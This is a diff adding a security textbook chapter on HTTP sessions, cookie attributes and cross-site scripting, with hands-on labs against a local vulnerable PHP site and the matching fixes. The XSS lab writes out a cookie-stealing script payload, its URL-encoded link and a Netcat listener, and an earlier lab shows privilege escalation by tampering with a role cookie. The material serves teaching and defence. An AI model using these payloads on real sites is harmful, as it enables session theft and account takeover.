@@ -149,15 +149,125 @@ Take the example of a file named `backup.sql` or `staging.zip`.  It is imaginabl
 >![[../images/09/bust_activity_login.png|Login as Administrator]]
 
 ### Solving Stateless HTTP
-Authentication
-Cookie Security
-> [!activity] Activity 9.4 - Cookie Privesc
+As described in the Web Applications Defense chapter, HTTP is a stateless protocol which means that each request and response is mutually exclusive.  This is a challenge for web applications as often the site's creators want to maintain the ability to track individual users overtime.  It is especially important when the application needs to control access to pages and data given a user's authenticated context.  Without a solution would require users to re-authenticate, or log in again, for each authenticated page requested.  Obviously that would degrade a user experience so a number of technologies have been developed over the decades to solve the authenticated user tracking.  
 
+Web applications can be configured to establish a **session** when a user requests a page.  The session is a file stored on the web server, or as data in a caching server, that will contain information related to the user of the site.  Session files are named or identified by a long and random string to ensure no two session identifiers collide.  The developers of the web application can store any information they wish within the session such as specific user information like an access role or if the user has been authenticated.  Storing information within the session ensures a level of security as the data within the session file can only be updated by the application and not the user directly.
+
+Web applications that use sessions will respond to user requests with the *set cookie* header that contains the name and value of a cookie.  A cookie is a small file that is store on the client's computer and accessible by the client's browser.  The name of the cookie could be anything meaningful to the application but an example could be "access-token" or "SESSID".  The value of this cookie would be the session identifier, that long and random string that is used to identify the session file on the web server.  Additional requests to the web application from the client will automatically include the *Cookie* header that includes the cookie name and value.  This is how the client and the web server can retain information, such as user log on status and permissions, between requests and responses.  
+
+![[../images/09/cookie_session_diagram.png|Cookie and Session Handling|450]]
+
+The above diagram illustrates this concept.  Assuming the client has visited and logged into a site previously, they submit a cookie "token=123abc" to the web server.  The web application looks up the session 123abc's "logged_in" value and confirms the user's state is True, logged in.  The application then response with the request page and data since the user was authenticated.  As long as the client submits the valid cookie, the web application looks up the session file on the web server and identifies that the user is logged in and allowed to request the page or data then returns an appropriate response.  If the user submits a request for an authenticated page without a valid cookie then the web application should respond with an access denied, or equivalent, response.
+
+Protecting web server session files is an integral part of securing web applications.  Weaknesses in this area would undermine the information within accounts on the web application which is a significant concern.  Session identifiers, which are used as cookie values client side, should be long and have high entropy.  The randomness of the value protects the session from being guessed, calculated, or bruteforced.  The web server, or system storing session information, should be well protected by applying least privileged access to the session files.  The web application must avoid *business logic flaws* or bugs that allow the bypassing of authentication and authorization controls that rely on sessions.  A common example of this is relying on a cookie value as an indicator of authentication or authorization state.  For instance, imagine an application that sets a cookie called "role" with a value of "user" and relies on the value when determining if a request is authorized to access a page or data.  An attacker could abuse this vulnerability by changing the cookie value to "administrator" and submitting a request to gain unauthorized access to pages or data low privileged users don't' have access to.  This vulnerability could be avoided by storing such detail within a session file server side and not a client side cookie.
+
+Client side cookies used for sensitive operations like storing users' authentication and authorization states must also be protected.  If a client side cookie, which is just a file store on the client's computer accessed by the browser, is obtained by an attacker they would be able to use it to access the web application as the user.  This means that the attacker would not need to know the victims password, also bypassing any multi-factor authentication security, and could navigate the web application without scrutiny.  Some web applications require that sensitive operations, like bank transfers or changing email addresses, re-authenticate to mitigate the risk of a victim's cookie being compromised.  The major browser developers have embedded security attributes to the *cookie jar*, where all cookies are store on the client, that protect the cookie from attack.
+![[../images/09/cookies.png|Browser Cookies for Google]]
+The screenshot above was taken from the development tools built into Microsoft Edge after visiting google.com.  Choosing the Application tab, expanding the Cookies folder in the left navigation pane and selecting the site reveals all the cookies set by Google.  Examining the columns of the cookie pane shows the following fields and their impact on security:
+
+- **Name** - the cookie's name
+- Value - the value of the cookie associated with the name
+- **Domain** - the website domain allowed to use the cookie.  Values for other sites here are called *third party cookies* which can be used to track users between sites they vist.
+- **Path** - The URI path the cookie is applied to.  In this example the cookie applies to all paths of the domain.
+- **Expires** - The date that the cookie is no longer valid.  This value can also be "session" which means that the cookie is expired when the browser closes.
+- Size - The number of bytes that the cookie value consists of.
+- **HttpOnly** - A boolean setting that instructs the browser if JavaScript is allowed to handle the cookie.  This setting mitigates the affects of cross-site scripting (XSS) attack; however, does not prevent so called *reverse browser* attacks.
+- **Secure** - Another boolean setting that instructs the browser to only send the cookie over encrypted HTTP channels.
+- **SameSite** - This attribute supports None, Lax (or blank), and Strict values informs the browser if other sites are allowed to use the cookie.  The default Lax setting allows only the domain and its subdomains from using the cookie.  This setting mitigates cross site request forgery (CSRF) attacks.
+
+As you can tell not all cookies need protections and several of the cookies from the previous screenshot don't have protections enabled because of their low attack value.
+
+> [!activity] Activity 9.4 - Cookie Privilege Escalation
+> A vulnerable web application system might rely on the use of cookies to configure authentication or authorization settings instead of using the server side session storage.  I will demonstrate a vulnerable web application that relies on a vulnerable client side cookie to access restricted pages.  This activity will reuse the Vulnerable Site docker container setup in the previous activity.
+> 
+> I launch the Kali VM, open a terminal and restart the vulnerable-site docker container used in the previous activity.
+> ```bash
+> docker start vulnerable-site
+> docker container ls
+> ```
+> ![[../images/09/cookie_activity_start.png|Restarting Vulnerable Site Docker Container|600]]
+> With the container restarted, I open Firefox and navigate to http://127.0.0.1/ and login with the low privilege user `daniel` whose password is `Password123` where I'm directed to the Users page.
+> ![[../images/09/cookie_activity_login.png|Low Privilege Login Landing Page]]
+> While logged in I open the developer tools (F12) and enumerate the available cookies.  Firefox is a little different the Edge where the cookies are under the Storage tab.
+> ![[../images/09/cookie_activity_enum.png|Developer Console Cookies]]
+> I see there is a PHPSESSID cookie which is the default session cookie used with PHP applications.  If an attacker were to obtain that cookie value they could impersonate my user in the vulnerable application.  Another cookie that draws my attention is the cookie called "role" which has a value of "user".  Perhaps the Vulnerable Site uses this token to direct users to pages that may require elevate privileges.  To test this I'll change the cookie value by double clicking the value for the role cookie and entering "administrator" then hitting enter.  
+> ![[../images/09/cookie_activity_modify.png|Modifying Role Cookie to Administrator|450]]
+> I refresh the page and see I am presented with the Admin page!
+> ![[../images/09/cookie_activity_refresh.png|Escalated Privileges and Revealed Admin Page|550]]
+> Let's explore where this vulnerability was introduced into the application source code and how to fix it.  Navigating to the vulnerable-site repository and the app folder I can open the index.php page using Nano.
+> ```bash
+> cd vulnerable-site/app
+> nano index.php
+> ```
+> ![[../images/09/cookie_activity_index.png|Opening Index Page|600]]
+> The index.php page contains the source code for the login page.  About half way down I see PHP function setcookie is used to create the role cookie with the supplied variable from the MySQL users table. 
+> ![[../images/09/cookie_activity_setcookie.png|Vulnerable SetCookie Function On Index.php|600]]
+> The magic variable `$_SESSION` is used to store data within a session server side.  I update the vulnerable line to `$_SESSION['role'] = $role;` to avoid exposing the role setting to a user controlled cookie.  I press CTRL+X and answer yes to save the file.
+> ![[../images/09/cookie_activity_index_session.png|Replacing SetCookie With $_SESSION|550]]
+> This fixes the application to not set the cookie but the it still relies on the cookie when a user visits the authenticated log on page home.php.  Investigating the home.php file shows an if statement that uses the magic variable `$_COOKIE` for the role cookie.
+> ![[../images/09/cookie_activity_home.png|Home File Cookie Vulnerablity|550]]
+> This magic variable relies on cookie "role" and needs to instead reference the session file on the server.  To fix it, and ensure the application still works, I update the line to `if($_SESSION['role'] == 'administrator') {`. 
+> ![[../images/09/cookie_activity_home_update.png|Fixing Home File To Use $_SESSION|550]]
+> After saving the file I restart the browser and login using the low privileged `daniel` user.  Navigating back to the developer tools I see that the role cookie is no longer available!
+> ![[../images/09/cookie_activity_fixed.png|Role Cookie Removed]]
 ### Cross Site Scripting (XSS)
-XSS Types
->[!activity] Activity 9.5 - Cross Site Scripting
+Modern web browsers have built-in JavaScript engines closely coupled with the *domain object model (DOM)* extending browser features and capabilities while enhancing user experience.  JavaScript runs in browsers and is currently the dominant programing language for dynamic front end development.  Software engineers take advantage of browsers running of JavaScript by developing applications, whose components or the entire application, that run client side.  Web sites can run JavaScript code from a file downloaded locally, a remote source, or inline within other file types such as HTML.
 
+Any system that runs, or executes, code has an interest to security because a vulnerability in that system could lead to *code injection* vulnerabilities.  Browsers use of JavaScript is no exception to this security impact as an attacker that exploits such a vulnerability would be able to run arbitrary code on the client's device.  These **cross site scripting (XSS)** attacks are performed by attackers by injecting malicious JavaScript that victims execute that can compromise the user's web application account.  Imagine a payload that grabs the application's session token from the cookie jar and forwards it to an attacker controlled system.  With this token an attacker can access the web application as that user from any device!  These same vulnerabilities could even lead to the victim's device or system becoming compromised if the attacker is able to exploit a vulnerability in the browser itself.  Such severity is usually limited to those who do not keep their browsers updated with the latest security patches, but there are many critical vulnerabilities discovered in modern browsers all the time.
+
+> [!tip] Tip - JavaScript Everywhere
+> Technically XSS vulnerabilities can be found anywhere that JavaScript is able to run which is not just the browser.  For example, many backend web servers now run JavaScript via NodeJS and many Microsoft Windows applications support running JavaScript such as VBScript.
+
+There are at least three forms of XSS vulnerabilities.  *Reflected* XSS requires the participation of the victim, usually by clicking on a link to the vulnerable web application with an embedded malicious JavaScript payload.  *Stored* XSS is more dangerous as the attacker is able to supply the malicious payload to the web application in advance where it is stored and later retrieved by the victim by visiting a page on the site.  *DOM based* XSS take advantage of embedding JavaScript within the browser's DOM and can be reflected or stored.  There is a less common fourth XSS vulnerability known as the *self* XSS where a user is socially engineered to run malicious JavaScript in their developer tools console.  Any of the three common XSS vulnerabilities always start with a source which is the user supplied input and end with a sink where the code is eventually render out by the victim.
+
+To protect against these vulnerabilities web application developer must ensure to validate untrusted inputs.  This work must be conducted server side as any client side validation efforts can be easily circumvented since anything coming from the client can be manipulated.  They can be any value that is received client side, such as headers and parameters, or values received from other systems, such as databases or third party APIs.  There are a few methods of validating such input with varying degrees of effectiveness.  The best method is to deny all and then allow by exception, so called *allowlisting* method or *whitelisting*.  In this approach all input is assumed to be invalid unless it matches provided criteria, such as character length, allowed characters, or keywords.  This is the best input validation method which will provide the most risk mitigation, unless that validation allows for characters needed for an XSS payload like `", > , <, '` and others.  Alternatively, the *blocklisting* method, also known as the *blacklist*, can provide some mitigation capabilities by assuming all inputs are allowed unless they match a provide list of invalid characters or strings.  This is a risky undertaking as there are many ways creative attackers could encode their payloads that may avoid the filter.  Regardless of the method chosen, seemingly safe input is passed along to the application and unsafe input is blocked usually informing the user with an error.
+
+I've often heard input validation and sanitization being used interchangeably but there is a technical difference.  The last input validation control is called *sanitization* where keywords or characters are removed from an input and then the remaining value is passed along to the application.  This method suffers from the same issue as blocklisting as the engineer assumes they will be able to capture all malicious characters and strings which is unlikely.  But it is preferred by many developers as it enhances the user experience by avoiding having to provide a user with an error message and removes frictions.  However, this sanitization of inputs would likely cause issues latter when the application uses that modified data.  If sanitization is used it must be recursively used where the input is reinspected after the initial sanitization check until no more abusive characters or strings remain.  Otherwise an attacker could provide a snippet such as `<s<script>ript>` where the sanitization logic will remove the `<script>` tag, concatenate the remaining value producing `<script>` and passing it along to the web application.
+
+While input validation deals with the vulnerability at the source, *output encoding* mitigates the risk at the sink.  The objective of output encoding is to render the input in a safe manner which won't be interpreted or executed by the client.  It does this by converting special characters into a safe encoding scheme and most languages have built in functions that will perform this task.  Technically, XSS is a due to improper handling of output, although mitigating the risk at the source and the sink ensures the most protection.
+
+>[!activity] Activity 9.5 - Cross Site Scripting
+>Our Vulnerable Site container used in the last couple activities also has a cross site scripting vulnerability.  I will explore the discovery and exploitation of this vulnerability using the Kali VM.  Afterwards I will demonstrate how to fix the underlying issue and validate the vulnerability's mitigation.
+>
+>Once the Kali VM is started and the Vulnerable Site is started, I launch Firefox, navigate to http://127.0.0.1/ and open the page's source by right clicking and selecting View Page Source.  Within the page source, I observe an HTML form with a hidden input named version with a value of beta.  This is one method web applications use to transfer data between requested pages.
+>![[../images/09/xss_activity_source.png|View Source of Vulnerable Site Index Page|550]]
+>I return to the login page and enter the low privileged username `daniel` and password `Password123` which places me at the User Page.  The page includes a footer with the content "Version: beta" and I can also see the URL has a GET parameter version with a value of beta.  
+>![[../images/09/xss_activity_user_page.png|User Page Version Rendering]]
+>It appears this page is rendering the GET parameter value.  To test this idea I change the value beta to foobar and reload the page.  The footer is updated with arbitrary values!
+>![[../images/09/xss_activity_foobar.png|Updating Footer with Arbitrary Values|250]]
+>Even though I am able to change the value, it does not indicate a vulnerability.  There could be input validation or output encoding protections which I won't know until I've tested them by trying other payloads.  One common XSS payload test is `<script>alert('xss')</script>` which is simple JavaScript that executes an alert box.  Using this benign payload demonstrates ability to execute arbitrary code in a clear manner.  These demonstrations are sometimes called *proof of concepts (PoC)*.  I try the XSS test payload by replacing the foobar value in the version parameter and reload the page.  This time, an alert box is presented which demonstrates an XSS vulnerability!
+>![[../images/09/xss_activity_xss_alert.png|XSS Alert Box Proof]]
+>This is usually enough evidence to recommend to a development team that the vulnerability needs to be fixed.  But an attacker would go much further including stealing a user's access cookie.  In the previous section we describe the importance of cookie security and when absent it leaves the cookie vulnerable to theft.  Opening the developer tools, navigating to the Storage tab and selecting the site shows the PHPSESSID token does not have the HttpOnly attribute set.  This means that JavaScript is permitted by the browser to interact with the cookie.
+>![[../images/09/xss_activity_cookie_review.png|PHPSESSID Cookie Security Check]]
+>I can chain the cookie and XSS vulnerabilities into an exploit to steal the PHPSESSID cookie value.  Knowing the cookie value empowers an attacker to use the web application as the user the cookie is assigned to.  I modify the previous alert box payload with `<script>var i=new Image;i.src="http://127.0.0.1:9001/?"+document.cookie;</script>` which references an image whose source is 127.0.0.1 on port 9001.  You can imagine replacing this IP address with one in the attacker's control, but since I am performing this demonstration on my local Kali VM I will just use port 9001 as the "attacker's server".  The source request includes a parameter value DOM reference to the cookie storage.  When a victim user follows a link with the embedded XSS payload for the Vulnerable Site they will inadvertently send their cookies to an attacker controlled server.  
+>
+>Before I can use this payload I have to convert it into a URL safe encoding scheme as the payload includes special characters used by the browser.  URL encoding is common enough and web applications automatically decode values prior to using them.  Here is the URL "safe" encoding of the previously mentioned payload that steal a victim's cookie. 
+>```
+>%3Cscript%3Evar%20i%3Dnew%20Image%3Bi.src%3D%22http%3A%2F%2F127.0.0.1%3A9001%2F%3F%22%2Bdocument.cookie%3B%3C%2Fscript%3E
+>```
+>Before sending the URL with the payload to the victim, the attacker needs to setup a server to collect the cookie.  Using Netcat, I setup a listener on port 9001 which matches the payload's source.
+>```bash
+>nc -lp 9001
+>```
+>![[../images/09/xss_activity_listener.png|Netcat Listener on Port 9001|600]]
+>The listener is standing by waiting for incoming connections.  With everything staged, the next step is to send the targeted victim a URL to Vulnerable Site with the malicious payload that will steal their cookie.  This requires that the victim is already logged into Vulnerable Site.
+>Acting as the victim, and assuming the malicious link was sent to them via email for example, I following the URL and observe the page mostly loads and then hangs.
+>```
+>http://127.0.0.1/home.php?version=%3Cscript%3Evar%20i%3Dnew%20Image%3Bi.src%3D%22http%3A%2F%2F127.0.0.1%3A9001%2F%3F%22%2Bdocument.cookie%3B%3C%2Fscript%3E
+>```
+>![[../images/09/xss_activity_mal_link.png|Triggered Exploit]]
+>From the attackers perspective monitoring the Netcat server listening on port 9001, I can see an incoming connection that includes the user's cookie!  From here the attacker could take the PHPSESSID cookie value and embed it within their cookie jar to access the site as the victim.
+>![[../images/09/xss_activity_cookie_captured.png|Attacker Captured Cookie|600]]
+>The rendering of the version variable on the page is quite the vulnerability!  It can be mitigated through input validation, output encoding, or both.  I will mitigate the vulnerability using the PHP function htmlspecialchars function where the value is rendered.  This output encoding strategy will eliminate the page's ability to execute the malicious JavaScript code.  The vulnerability is on the last line of the home.php page resulting from an echo statement that concatenates the version GET paramater.
+>![[../images/09/xss_activity_vuln_code.png|Vulnerable Echo In Home File|600]]
+>I update the vulnerable echo statement by wrapping the GET concatenation with the built-in htmlspecialchars function and save the file.
+>```php
+>echo "Version: ".htmlspecialchars($_GET['version']);
+>```
+>Reloading the malicious URL now renders the payload in the version parameter on the page without executing it.
+>![[../images/09/xss_activity_fixed.png|Fixed XSS Vulnerability Renders as Plain Text]]
 ### Relational Databases
+
 Database Queries
 SQL Injection (SQLi)
 SQLi Mitigations
